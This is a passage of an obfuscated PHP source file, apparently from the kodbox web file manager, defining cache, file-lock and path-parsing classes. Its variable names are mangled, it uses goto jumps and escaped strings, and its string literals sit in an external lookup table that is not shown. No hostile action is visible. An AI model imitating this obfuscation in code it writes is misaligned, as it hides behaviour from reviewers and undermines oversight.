<?php
 goto D§…’–Ï÷ö; Dìƒ¶¼â¡›: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÏáÕ™À„ =& $_SERVER[¦»×‡Ãã]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $§ÂÕ©í‹ = $GLOBALS[$ÏáÕ™À„[6]][$ÏáÕ™À„[425]]; $ììÑü·ù = $§ÂÕ©í‹[$§ÂÕ©í‹[$ÏáÕ™À„[899]]]; $¸Ã±Ë»¾ = $§ÂÕ©í‹[$ÏáÕ™À„[900]]; switch ($§ÂÕ©í‹[$ÏáÕ™À„[899]]) { case $ÏáÕ™À„[21]: self::$handle = Model($ÏáÕ™À„[901]); break; case $ÏáÕ™À„[902]: self::$handle = new CacheRedis($ììÑü·ù, $¸Ã±Ë»¾); break; case $ÏáÕ™À„[903]: self::$handle = new CacheMemcached($ììÑü·ù, $¸Ã±Ë»¾); break; case $ÏáÕ™À„[230]: self::$handle = new CacheFile($ììÑü·ù, $¸Ã±Ë»¾); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¥œ—İ»¨) { if (is_array($¥œ—İ»¨) || is_object($¥œ—İ»¨)) { $¥œ—İ»¨ = json_encode($¥œ—İ»¨); } $¥œ—İ»¨ = rawurlencode($¥œ—İ»¨); return md5(KOD_SITE_ID . $_SERVER[¦»×‡Ãã][11] . $¥œ—İ»¨); } public static function get($¢œúçë, $Ñ›÷Ì»ì = false) { $òÒ½Ç´÷ = self::key($¢œúçë); $Ú¡Ü²ı‹ = self::init(); if ($Ñ›÷Ì»ì) { return unserialize($Ú¡Ü²ı‹->get($òÒ½Ç´÷)); } if (!isset(self::$memoryCache[$òÒ½Ç´÷])) { $Ú–º³´± = $Ú¡Ü²ı‹->get($òÒ½Ç´÷); self::$memoryCache[$òÒ½Ç´÷] = unserialize($Ú–º³´±); } return self::$memoryCache[$òÒ½Ç´÷]; } public static function set($äÙŠèâ¥, $ĞéĞ·, $‡”¯–àĞ = false) { $‚ı•ûú§ =& $_SERVER[¦»×‡Ãã]; $ßë±ìÉ¸ = self::key($äÙŠèâ¥); if (isset(self::$memoryCache[$ßë±ìÉ¸]) && self::$memoryCache[$ßë±ìÉ¸] === $ĞéĞ·) { return !0; } if ($‡”¯–àĞ === 0) { self::$memoryCache[$ßë±ìÉ¸] = $ĞéĞ·; return !0; } $¥ĞÜ™æî = self::init(); $ÓÄè”—Ó = serialize($ĞéĞ·); CacheLock::lock($äÙŠèâ¥ . $‚ı•ûú§[904]); $¤êßšÁƒ = $¥ĞÜ™æî->set($ßë±ìÉ¸, $ÓÄè”—Ó, $‡”¯–àĞ); self::$memoryCache[$ßë±ìÉ¸] = $ĞéĞ·; CacheLock::unlock($äÙŠèâ¥ . $‚ı•ûú§[904]); return $¤êßšÁƒ; } public static function getCall($¾²Ó˜Ê†, $‹‚ŸŒ˜†, $ê­ÎØˆ, $ÉÊüë¾¤ = array()) { $‰’÷§åí =& $_SERVER[¦»×‡Ãã]; $ç–¾ß  = self::get($¾²Ó˜Ê†); if ($ç–¾ß  || $ç–¾ß  === $‰’÷§åí[12]) { return $ç–¾ß ; } $ç–¾ß  = call_user_func_array($ê­ÎØˆ, $ÉÊüë¾¤); $ç–¾ß  = $ç–¾ß  ? $ç–¾ß  : $‰’÷§åí[12]; self::set($¾²Ó˜Ê†, $ç–¾ß , $‹‚ŸŒ˜†); return $ç–¾ß ; } public static function remove($æ”œ°ôè) { $–ğİÃÄ = self::key($æ”œ°ôè); unset(self::$memoryCache[$–ğİÃÄ]); self::clearTimeout(); CacheLock::lock($æ”œ°ôè); $’¯Š¾ßÙ = self::init()->remove($–ğİÃÄ); CacheLock::unlock($æ”œ°ôè); return $’¯Š¾ßÙ; } public static function removeMemory($„Ò‚° ú) { $ù¥Œ¬ÄÖ = self::key($„Ò‚° ú); unset(self::$memoryCache[$ù¥Œ¬ÄÖ]); } public static function clearMemory($è¶Îşæ« = false) { if ($è¶Îşæ«) { $è¶Îşæ« = self::key($è¶Îşæ«); unset(self::$memoryCache[$è¶Îşæ«]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¦»×‡Ãã][905])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¦»×‡Ãã][906])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ñğ¥“, $ŸªÌ–˜¶) { $¾ÆµÚë» =& $_SERVER[¦»×‡Ãã]; $this->cachePath = $Ñğ¥“[$¾ÆµÚë»[87]]; $this->prefix = $¾ÆµÚë»[907]; $this->cacheTime = $ŸªÌ–˜¶; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‹ÛçæÕ) { $á²»›ó… =& $_SERVER[¦»×‡Ãã]; $‹ÛçæÕ = str_replace(array($á²»›ó…[908], $á²»›ó…[100], $á²»›ó…[76]), $á²»›ó…[909], $‹ÛçæÕ); return $this->cachePath . $á²»›ó…[910] . $‹ÛçæÕ . $á²»›ó…[911]; } public function set($¨™ÖÓ¶Î, $‰í‚›æô, $·‚àÛ’² = false) { $·‚àÛ’² = $·‚àÛ’² ? $·‚àÛ’² : $this->cacheTime; $âÕ¿»­ó = $this->getFile($¨™ÖÓ¶Î); if (file_put_contents($âÕ¿»­ó, $this->prefix . $‰í‚›æô, LOCK_EX)) { @touch($âÕ¿»­ó, intval(time() + $·‚àÛ’²)); clearstatcache(); return !0; } @unlink($âÕ¿»­ó); return !1; } public function get($…Í›çŞ) { $ÖĞºüÓ = $this->getFile($…Í›çŞ); if (file_exists($ÖĞºüÓ) && filemtime($ÖĞºüÓ) < time()) { @unlink($ÖĞºüÓ); return !1; } $ÅŠø»‰Ò = @file_get_contents($ÖĞºüÓ); return substr($ÅŠø»‰Ò, strlen($this->prefix)); } public function remove($÷£ûä©™) { $Ÿ•¡Ó¶ğ = $this->getFile($÷£ûä©™); return @unlink($Ÿ•¡Ó¶ğ); } public function deleteAll() { $î£ºÛ“¡ =& $_SERVER[¦»×‡Ãã]; $ı¬œ’Š½ = scandir($this->cachePath); foreach ($ı¬œ’Š½ as $÷Ÿãü…) { $¬·Ø×ûÕ = $this->cachePath . $÷Ÿãü…; if (strpos($¬·Ø×ûÕ, $î£ºÛ“¡[911]) && strpos($¬·Ø×ûÕ, $î£ºÛ“¡[912])) { @unlink($¬·Ø×ûÕ); } } } public function clearTimeout() { $¨ÈÂÛôÊ =& $_SERVER[¦»×‡Ãã]; $´”Ä– = scandir($this->cachePath); foreach ($´”Ä– as $¸òŸ¾§) { $Ôô» = $this->cachePath . $¸òŸ¾§; if (strpos($Ôô», $¨ÈÂÛôÊ[911]) && strpos($Ôô», $¨ÈÂÛôÊ[912]) && filemtime($Ôô») < time()) { @unlink($Ôô»); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¢Š£óÃ =& $_SERVER[¦»×‡Ãã]; if (self::$handle) { return self::$handle; } $à–Ìâ– = $GLOBALS[$¢Š£óÃ[6]][$¢Š£óÃ[425]]; self::$timeout = $à–Ìâ–[$¢Š£óÃ[913]] ? $à–Ìâ–[$¢Š£óÃ[913]] : 10; $È¿ƒ®‚« = _get($GLOBALS[$¢Š£óÃ[6]], $¢Š£óÃ[914]); $ŠòÓÓ‚ = $à–Ìâ–[$¢Š£óÃ[899]] ? $à–Ìâ–[$¢Š£óÃ[899]] : $¢Š£óÃ[230]; if ($ŠòÓÓ‚ == $¢Š£óÃ[21] && $È¿ƒ®‚« == $¢Š£óÃ[13]) { $ŠòÓÓ‚ = $¢Š£óÃ[230]; } switch ($ŠòÓÓ‚) { case $¢Š£óÃ[902]: self::$handle = new CacheLockRedis(); break; case $¢Š£óÃ[903]: self::$handle = new CacheLockMemcached(); break; case $¢Š£óÃ[21]: self::$handle = new CacheLockDatabase(); break; case $¢Š£óÃ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¢Š£óÃ[915], $¢Š£óÃ[916]); } return self::$handle; } private static function key($˜ ï¼İÏ) { return $_SERVER[¦»×‡Ãã][917] . Cache::key($˜ ï¼İÏ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¢ÏÄÒßÉ = '') { self::$errorMsg = $¢ÏÄÒßÉ; } public static function lockGlobal($åĞ×”ÓÍ, $·á°±¦) { return self::lock($åĞ×”ÓÍ, $·á°±¦, !0); } public static function lock($Ÿ€•±Ò®, $ ”Ôä©â = false, $©œ·«» = false) { $Éë€ùà =& $_SERVER[¦»×‡Ãã]; $ÈùæÉ = self::init(); $Î™ª™€ô = self::key($Ÿ€•±Ò®); $ ”Ôä©â = $ ”Ôä©â ? $ ”Ôä©â : self::$timeout; $¹å©–ì = timeFloat(); $¿Úû½§ = $ÈùæÉ->lock($Î™ª™€ô, $ ”Ôä©â); $ãş§¡“ = timeFloat(); if (!$¿Úû½§) { $Â¨“é¦‹ = "\154\x6f\x63\x6b\x20\145\162\x72\x6f\x72\73\153\145\x79\x3d{$Ÿ€•±Ò®}\73\164\151\155\145\x3d{$ ”Ôä©â}\73" . self::$errorMsg . $Éë€ùà[74] . get_caller_msg(); $İéË§ƒè = LNG($Éë€ùà[918]) . "\50{$ ”Ôä©â}\163\51\x2e" . LNG($Éë€ùà[919]); $İéË§ƒè .= $Éë€ùà[920]; if (is_string(self::$errorMsg) && self::$errorMsg) { $İéË§ƒè = $İéË§ƒè . $Éë€ùà[921] . self::$errorMsg; } write_log($Éë€ùà[922] . sprintf($Éë€ùà[923], timeFloat() - $¹å©–ì) . $Éë€ùà[924] . $Â¨“é¦‹ . $Éë€ùà[925] . error_get_last(), $Éë€ùà[916]); show_json($İéË§ƒè, !1); } if (!$©œ·«») { self::$lockItem[$Î™ª™€ô] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $îË ï = number_format(timeFloat() - $ãş§¡“, 3); write_log($Éë€ùà[926] . $Ÿ€•±Ò® . $Éë€ùà[927] . $îË ï, $Éë€ùà[916]); } return $¿Úû½§; } public static function lockGet($ÌƒÈ¥ğÈ) { $ÁíÈƒ = self::key($ÌƒÈ¥ğÈ); if (self::$lockItem[$ÁíÈƒ]) { return self::$lockItem[$ÁíÈƒ]; } return self::init()->lockGet($ÁíÈƒ); } public static function unlock($ÚµÏ«ñï) { $“Å€Ïê± =& $_SERVER[¦»×‡Ãã]; $‘¬ÓÀ™¶ = self::key($ÚµÏ«ñï); self::$lockItem[$‘¬ÓÀ™¶] = null; self::init()->unlock($‘¬ÓÀ™¶); if (GLOBAL_DEBUG_LOG_ALL) { write_log($“Å€Ïê±[928] . $ÚµÏ«ñï, $“Å€Ïê±[916]); } return; } public static function unlockRuntime() { $é£¢¥¹ß =& $_SERVER[¦»×‡Ãã]; $—½×³”¾ = self::init(); $ÃÑ…ÑÉ = !1; foreach (self::$lockItem as $ŒÌ¬„Ãá => $ÌİğÛóÓ) { if (!$ÌİğÛóÓ) { continue; } $—½×³”¾->unlock($ŒÌ¬„Ãá); if (!$ÃÑ…ÑÉ) { $ÃÑ…ÑÉ = !0; write_log($é£¢¥¹ß[929] . $ŒÌ¬„Ãá . $é£¢¥¹ß[74] . get_caller_msg(), $é£¢¥¹ß[916]); continue; } write_log($é£¢¥¹ß[929] . $ŒÌ¬„Ãá, $é£¢¥¹ß[916]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $„™ï…İ» = number_format(timeFloat() - TIME_FLOAT, 3); write_log($é£¢¥¹ß[930] . $„™ï…İ» . $é£¢¥¹ß[931] . ACTION, $é£¢¥¹ß[916]); } } public static function fileLock($ğ’×œŒº) { $ÍğĞñé¹ =& $_SERVER[¦»×‡Ãã]; if (!$GLOBALS[$ÍğĞñé¹[932]]) { $GLOBALS[$ÍğĞñé¹[932]] = array(); } $GLOBALS[$ÍğĞñé¹[932]][$ğ’×œŒº] = !1; $ºı›ü‚» = fopen(DATA_PATH . $ğ’×œŒº . $ÍğĞñé¹[933], $ÍğĞñé¹[934]); if (!$ºı›ü‚») { return !1; } $GLOBALS[$ÍğĞñé¹[932]][$ğ’×œŒº] = $ºı›ü‚»; if (flock($ºı›ü‚», LOCK_EX)) { return !0; } self::unlock($ğ’×œŒº); show_json($ÍğĞñé¹[935], !1); return !1; } public static function fileUnlock($ºÖ²†¡) { $‘¦„”šş =& $_SERVER[¦»×‡Ãã]; $±òêÑŞ = $GLOBALS[$‘¦„”šş[932]][$ºÖ²†¡]; if (!$±òêÑŞ) { return; } $GLOBALS[$‘¦„”šş[932]][$ºÖ²†¡] = !1; flock($±òêÑŞ, LOCK_UN); fclose($±òêÑŞ); } public static function fileUnlockAll() { $–‚ÔÄì =& $_SERVER[¦»×‡Ãã]; if (!isset($GLOBALS[$–‚ÔÄì[932]]) || !$GLOBALS[$–‚ÔÄì[932]]) { return; } foreach ($GLOBALS[$–‚ÔÄì[932]] as $¸˜ìˆğù => $à¹æî¤) { if (!$à¹æî¤) { continue; } $GLOBALS[$–‚ÔÄì[932]][$¸˜ìˆğù] = !1; flock($à¹æî¤, LOCK_UN); fclose($à¹æî¤); } $GLOBALS[$–‚ÔÄì[932]] = array(); } } goto Dì®­õ““İ; c­‹–‘¦İ®: class KodIO { const KOD_SOURCE = "\x7b\163\157\165\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\x52\x65\143\x79\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\x46\151\154\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\106\x69\154\145\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\160\122\x6f\157\164\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\x72\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\x53\150\x61\x72\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\145\x54\157\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\141\162\145\111\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\145\111\x74\145\x6d\x4c\x69\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\x52\x65\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\x65\162\x7d"; public static function typeList() { $ò÷©›Ùã =& $_SERVER[¦»×‡Ãã]; return array($ò÷©›Ùã[1336] => self::KOD_SOURCE, $ò÷©›Ùã[1337] => self::KOD_USER_RECYCLE, $ò÷©›Ùã[1338] => self::KOD_USER_FAV, $ò÷©›Ùã[1339] => self::KOD_USER_FILE_TAG, $ò÷©›Ùã[1340] => self::KOD_USER_FILE_TYPE, $ò÷©›Ùã[1341] => self::KOD_GROUP_ROOT_SELF, $ò÷©›Ùã[1342] => self::KOD_USER_SHARE, $ò÷©›Ùã[1343] => self::KOD_USER_SHARE_LINK, $ò÷©›Ùã[1344] => self::KOD_USER_SHARE_TO_ME, $ò÷©›Ùã[1345] => self::KOD_SHARE_ITEM, $ò÷©›Ùã[1346] => self::KOD_SHARE_LINK, $ò÷©›Ùã[1347] => self::KOD_SEARCH, $ò÷©›Ùã[1348] => self::KOD_BLOCK, $ò÷©›Ùã[1349] => self::KOD_IO, $ò÷©›Ùã[1350] => self::KOD_USER_RECENT, $ò÷©›Ùã[1351] => self::KOD_USER_DRIVER); } public static function parse($š¿”Ü·) { $»œ³ÈôØ =& $_SERVER[¦»×‡Ãã]; $š¿”Ü· = self::clear($š¿”Ü·); $ßËŠ¾™¥ = array_values(self::typeList()); preg_match($»œ³ÈôØ[1352], $š¿”Ü·, $ÁŞÛ¨’); $ÍÏ †õ = array($»œ³ÈôØ[496] => !1, $»œ³ÈôØ[1353] => !1, $»œ³ÈôØ[493] => !1, $»œ³ÈôØ[87] => $š¿”Ü·, $»œ³ÈôØ[1251] => !1, $»œ³ÈôØ[1250] => $»œ³ÈôØ[12]); if (is_array($ÁŞÛ¨’) && count($ÁŞÛ¨’) == 5) { $«µÕ´Ö = $»œ³ÈôØ[1354] . $ÁŞÛ¨’[2] . $»œ³ÈôØ[403]; if (in_array($«µÕ´Ö, $ßËŠ¾™¥)) { $ÍÏ †õ[$»œ³ÈôØ[1251]] = $ÁŞÛ¨’[1]; $ÍÏ †õ[$»œ³ÈôØ[33]] = $«µÕ´Ö; $ÍÏ †õ[$»œ³ÈôØ[1355]] = substr($«µÕ´Ö, 1, -1); $ÍÏ †õ[$»œ³ÈôØ[475]] = $ÁŞÛ¨’[3]; } $ÍÏ †õ[$»œ³ÈôØ[1250]] = $ÁŞÛ¨’[4]; } $©±Œ›„ = array($»œ³ÈôØ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÍÏ †õ[$»œ³ÈôØ[1318]] = in_array($ÍÏ †õ[$»œ³ÈôØ[33]], $©±Œ›„); return $ÍÏ †õ; } public static function isTruePath($´‰–¯Ù“) { $ñ°¸Ì ë =& $_SERVER[¦»×‡Ãã]; if (substr($´‰–¯Ù“, 0, 1) != $ñ°¸Ì ë[1354]) { return !0; } if (strpos($´‰–¯Ù“, $ñ°¸Ì ë[483]) === 0) { return !0; } if (strpos($´‰–¯Ù“, $ñ°¸Ì ë[1322]) === 0) { return !0; } if (strpos($´‰–¯Ù“, $ñ°¸Ì ë[1356]) === 0) { return !0; } if (strpos($´‰–¯Ù“, $ñ°¸Ì ë[1357]) === 0) { return !0; } if (strpos($´‰–¯Ù“, $ñ°¸Ì ë[1358]) === 0) { return !0; } return !1; } public static function clear($Ñ‘¬¿Ôº) { $¨Š¿“ì¾ =& $_SERVER[¦»×‡Ãã]; $Ñ‘¬¿Ôº = str_replace(array($¨Š¿“ì¾[1157], $¨Š¿“ì¾[262]), $¨Š¿“ì¾[53], $Ñ‘¬¿Ôº); $Ñ‘¬¿Ôº = str_replace($¨Š¿“ì¾[100], $¨Š¿“ì¾[8], $Ñ‘¬¿Ôº); $¾èéñà  = $¨Š¿“ì¾[1359]; if (substr($Ñ‘¬¿Ôº, 0, 3) == $¨Š¿“ì¾[1360]) { $Ñ‘¬¿Ôº = substr($Ñ‘¬¿Ôº, 3); } while (strstr($Ñ‘¬¿Ôº, $¾èéñà )) { $Ñ‘¬¿Ôº = str_replace($¾èéñà , $¨Š¿“ì¾[8], $Ñ‘¬¿Ôº); } $Ñ‘¬¿Ôº = preg_replace($¨Š¿“ì¾[1361], $¨Š¿“ì¾[8], $Ñ‘¬¿Ôº); if ($Ñ‘¬¿Ôº == $¨Š¿“ì¾[8]) { return $¨Š¿“ì¾[8]; } $Ñ‘¬¿Ôº = rtrim($Ñ‘¬¿Ôº, $¨Š¿“ì¾[8]); return $Ñ‘¬¿Ôº; } public static function pathTrue($ùÃˆğ¾í) { $©¼ó‹›Æ =& $_SERVER[¦»×‡Ãã]; if (!$ùÃˆğ¾í) { return $©¼ó‹›Æ[12]; } $ùÃˆğ¾í = str_replace($©¼ó‹›Æ[592], $©¼ó‹›Æ[8], str_replace($©¼ó‹›Æ[1362], $©¼ó‹›Æ[8], $ùÃˆğ¾í)); $ùÃˆğ¾í = str_replace($©¼ó‹›Æ[592], $©¼ó‹›Æ[8], str_replace($©¼ó‹›Æ[1362], $©¼ó‹›Æ[8], $ùÃˆğ¾í)); if (!strstr($ùÃˆğ¾í, $©¼ó‹›Æ[1360])) { return $ùÃˆğ¾í; } $ù´¢ÜÏ¸ = explode($©¼ó‹›Æ[8], $ùÃˆğ¾í); foreach ($ù´¢ÜÏ¸ as $»˜Ñ“ => $ûœˆÚÑÓ) { if ($ûœˆÚÑÓ !== $©¼ó‹›Æ[1363]) { continue; } for ($¼ûó€°ç = $»˜Ñ“; $¼ûó€°ç >= 0; $¼ûó€°ç--) { if ($ù´¢ÜÏ¸[$¼ûó€°ç] === $©¼ó‹›Æ[10] || $ù´¢ÜÏ¸[$¼ûó€°ç] === $©¼ó‹›Æ[1363] || $ù´¢ÜÏ¸[$¼ûó€°ç] === -1) { continue; } if ($ù´¢ÜÏ¸[$¼ûó€°ç] === $©¼ó‹›Æ[12]) { $ù´¢ÜÏ¸[$»˜Ñ“] = -1; break; } $ù´¢ÜÏ¸[$»˜Ñ“] = -1; $ù´¢ÜÏ¸[$¼ûó€°ç] = -1; break; } } $â€ŸÕ¿ˆ = array(); foreach ($ù´¢ÜÏ¸ as $ûœˆÚÑÓ) { if ($ûœˆÚÑÓ !== -1) { $â€ŸÕ¿ˆ[] = $ûœˆÚÑÓ; } } $ì¹§Á÷Î = implode($©¼ó‹›Æ[8], $â€ŸÕ¿ˆ); if (strpos($ì¹§Á÷Î, $©¼ó‹›Æ[1364]) === 0) { $ì¹§Á÷Î = $©¼ó‹›Æ[1360] . substr($ì¹§Á÷Î, strlen($©¼ó‹›Æ[1364])); } return $ì¹§Á÷Î; } public static function pathUrlClear($™­¶‰¬ò) { $ñòĞßÊë =& $_SERVER[¦»×‡Ãã]; if (!$™­¶‰¬ò) { return $™­¶‰¬ò; } $™­¶‰¬ò = rawurldecode($™­¶‰¬ò); $™­¶‰¬ò = str_replace($ñòĞßÊë[1362], $ñòĞßÊë[8], $™­¶‰¬ò); if (strpos($™­¶‰¬ò, $ñòĞßÊë[76]) > 0) { $™­¶‰¬ò = substr($™­¶‰¬ò, 0, strpos($™­¶‰¬ò, $ñòĞßÊë[76])); } if (strpos($™­¶‰¬ò, $ñòĞßÊë[1365]) > 0) { $™­¶‰¬ò = substr($™­¶‰¬ò, 0, strpos($™­¶‰¬ò, $ñòĞßÊë[1365])); } return $™­¶‰¬ò; } public static function sourceID($ôÑ¢æ†¦) { $·Ç‰½ïÊ =& $_SERVER[¦»×‡Ãã]; $ª­ß–Ù = self::parse($ôÑ¢æ†¦); if ($ª­ß–Ù[$·Ç‰½ïÊ[33]] !== self::KOD_SOURCE) { show_json(LNG($·Ç‰½ïÊ[1366]), !1); } return $ª­ß–Ù[$·Ç‰½ïÊ[475]]; } public static function make($Ëİò”¡) { if (!$Ëİò”¡) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ëİò”¡)); } public static function makeShare($•æéÛáÂ, $éû±Ÿ«) { return self::makePath(self::KOD_SHARE_ITEM, $•æéÛáÂ, $éû±Ÿ«); } public static function makeFileTypePath($Ì±Ó§Ã) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ì±Ó§Ã); } public static function makeFileTagPath($½å‘¯»¯) { return self::makePath(self::KOD_USER_FILE_TAG, $½å‘¯»¯); } public static function makePath($ü©®ïõä, $“—µò§İ = '', $øÁÀ¬¨¯ = '') { $Şğ›¥• =& $_SERVER[¦»×‡Ãã]; $‡öêŞîğ = substr($ü©®ïõä, 1, -1); $©Ú²€æ = $Şğ›¥•[1367] . $‡öêŞîğ . $Şğ›¥•[1368] . $“—µò§İ . $Şğ›¥•[1369]; $©Ú²€æ = $øÁÀ¬¨¯ ? $©Ú²€æ . $øÁÀ¬¨¯ . $Şğ›¥•[8] : $©Ú²€æ; return $©Ú²€æ; } public static function hashPath($œ˜Á•õª, $Ëßİşı = true) { $âı¹¸üõ =& $_SERVER[¦»×‡Ãã]; $­´°ŒëÎ = is_array($œ˜Á•õª) ? $œ˜Á•õª : IO::info($œ˜Á•õª); $°øƒÏ• = _get($­´°ŒëÎ, $âı¹¸üõ[1370], $âı¹¸üõ[12]); if (!$°øƒÏ• && isset($­´°ŒëÎ[$âı¹¸üõ[235]])) { $°øƒÏ• = trim($­´°ŒëÎ[$âı¹¸üõ[235]], $âı¹¸üõ[121]); } if (!$°øƒÏ• && isset($­´°ŒëÎ[$âı¹¸üõ[193]]) && $­´°ŒëÎ[$âı¹¸üõ[193]]) { $­´°ŒëÎ = IO::info(KodIO::make($­´°ŒëÎ[$âı¹¸üõ[193]])); $°øƒÏ• = _get($­´°ŒëÎ, $âı¹¸üõ[1370], $âı¹¸üõ[12]); } $•·³æ†¿ = md5($­´°ŒëÎ[$âı¹¸üõ[87]] . $­´°ŒëÎ[$âı¹¸üõ[79]] . $­´°ŒëÎ[$âı¹¸üõ[88]]); if (!$°øƒÏ• && file_exists($­´°ŒëÎ[$âı¹¸üõ[87]])) { $°øƒÏ• = Cache::get($•·³æ†¿ . $âı¹¸üõ[1371]); $°øƒÏ• = !1; if (!$°øƒÏ•) { $°øƒÏ• = IO::hashSimple($­´°ŒëÎ[$âı¹¸üõ[87]]); Cache::set($•·³æ†¿ . $âı¹¸üõ[1371], $°øƒÏ•, 3600 * 24 * 30); } } if ($Ëßİşı && !$°øƒÏ•) { } return $°øƒÏ• ? $°øƒÏ• : $•·³æ†¿; } public static function hashPathSafe($×º›àŠ×, $€éôÛ = true) { $ÌÕ¯İÛ =& $_SERVER[¦»×‡Ãã]; $‰ã‰©¤‚ = self::hashPath($×º›àŠ×, $€éôÛ); return md5($‰ã‰©¤‚ . $ÌÕ¯İÛ[1372] . Model($ÌÕ¯İÛ[843])->get($ÌÕ¯İÛ[844])); } public static function initSystemPath() { $á²Ôû¹Ö =& $_SERVER[¦»×‡Ãã]; if (defined($á²Ôû¹Ö[1373])) { return; } define($á²Ôû¹Ö[1373], self::systemPath($á²Ôû¹Ö[191])); define($á²Ôû¹Ö[1374], self::systemPath($á²Ôû¹Ö[1375])); define($á²Ôû¹Ö[1376], self::systemPath($á²Ôû¹Ö[1377])); define($á²Ôû¹Ö[1378], self::systemPath($á²Ôû¹Ö[1379])); IOHistory::bindEvent(); } public static function systemPath($ñİŞ¶Ü°) { $áÂÁ•€ò =& $_SERVER[¦»×‡Ãã]; $ì‚¨Îã¤ = $áÂÁ•€ò[1380] . ucfirst($ñİŞ¶Ü°); $ç¢åÜ° = Model($áÂÁ•€ò[843])->get($ì‚¨Îã¤); if ($ç¢åÜ°) { return $ç¢åÜ°; } if ($ñİŞ¶Ü° == $áÂÁ•€ò[191]) { $ç¢åÜ° = self::make(Model($áÂÁ•€ò[897])->systemRootPathAdd($áÂÁ•€ò[605])); } else { $ç¢åÜ° = self::systemPath($áÂÁ•€ò[191]); $šš©Šó‰ = self::sourceID($ç¢åÜ°); $ç¢åÜ° = self::make(Model($áÂÁ•€ò[897])->mkdir($šš©Šó‰, $ñİŞ¶Ü°)); } Model($áÂÁ•€ò[843])->set($ì‚¨Îã¤, $ç¢åÜ°); return $ç¢åÜ°; } public static function systemFolder($êû–µÍé) { $Üº«ûµ½ = IO_PATH_SYSTEM_SOURCE . $êû–µÍé; $¢ËöŠÈš = Cache::get($Üº«ûµ½); if (!$¢ËöŠÈš) { $¿ÅôÄ²Ò = IO::infoFullSimple($Üº«ûµ½); if (!$¿ÅôÄ²Ò) { $¢ËöŠÈš = IO::mkdir($Üº«ûµ½, REPEAT_SKIP); } else { $¢ËöŠÈš = $¿ÅôÄ²Ò[$_SERVER[¦»×‡Ãã][87]]; } Cache::set($Üº«ûµ½, $¢ËöŠÈš, 3600 * 10); } return $¢ËöŠÈš; } public static function defaultDriver() { return Model($_SERVER[¦»×‡Ãã][840])->defaultDriver(); } public static function defaultIO() { $©é‰ç’ò =& $_SERVER[¦»×‡Ãã]; $Ä¯»ö” = self::defaultDriver(); return $©é‰ç’ò[1381] . $Ä¯»ö”[$©é‰ç’ò[475]] . $©é‰ç’ò[1369]; } public static function defaultDriverInit() { static $úÅõÁŞ¦ = false; if ($úÅõÁŞ¦) { return $úÅõÁŞ¦; } $úÅõÁŞ¦ = IO::init(self::defaultIO()); return $úÅõÁŞ¦; } public static function fileTypeList() { $¦ÓŒ¾»ñ =& $_SERVER[¦»×‡Ãã]; $Ú³¡Ú = $GLOBALS[$¦ÓŒ¾»ñ[6]][$¦ÓŒ¾»ñ[1382]]; foreach ($Ú³¡Ú as $¡÷Œ»ÕĞ => $ú’ÒÖçÏ) { $€œ‚›‡ = $¦ÓŒ¾»ñ[1383] . $¡÷Œ»ÕĞ; $ä ĞÎ©â = LNG($€œ‚›‡); if ($€œ‚›‡ != $ä ĞÎ©â) { $Ú³¡Ú[$¡÷Œ»ÕĞ][$¦ÓŒ¾»ñ[32]] = $ä ĞÎ©â; } } return $Ú³¡Ú; } public static function diskList($şüŠ·ô = true) { $Üşú¸ùÂ = $_SERVER[¦»×‡Ãã][1384]; if ($şüŠ·ô) { $À¢İô®– = Cache::get($Üşú¸ùÂ); if (is_array($À¢İô®–)) { return $À¢İô®–; } } $À¢İô®– = self::diskListGet(); Cache::set($Üşú¸ùÂ, $À¢İô®–, 60); return $À¢İô®–; } public static function diskListGet() { $ñ£ùúÒú =& $_SERVER[¦»×‡Ãã]; $‚ğàâ±ö = array(); if ($GLOBALS[$ñ£ùúÒú[6]][$ñ£ùúÒú[1385]] == $ñ£ùúÒú[1386]) { $±î‰ÍÔÊ = $ñ£ùúÒú[1387]; for ($…¤âóœ½ = 0; $…¤âóœ½ < strlen($±î‰ÍÔÊ); $…¤âóœ½++) { $ü˜¸”˜ = $±î‰ÍÔÊ[$…¤âóœ½] . $ñ£ùúÒú[1388]; if (file_exists($ü˜¸”˜)) { $‚ğàâ±ö[] = $ü˜¸”˜; } } return $‚ğàâ±ö; } if (!function_exists($ñ£ùúÒú[101])) { $‚ğàâ±ö[] = 